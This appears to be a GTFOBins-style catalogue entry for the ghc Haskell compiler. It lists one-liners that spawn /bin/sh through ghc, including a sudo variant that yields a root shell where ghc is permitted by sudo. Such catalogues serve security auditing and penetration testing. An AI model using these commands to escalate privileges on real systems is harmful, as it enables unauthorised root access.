---
functions:
  shell:
    - code: ghc -e 'System.Process.callCommand "/bin/sh"'
  sudo:
    - code: sudo ghc -e 'System.Process.callCommand "/bin/sh"'
---
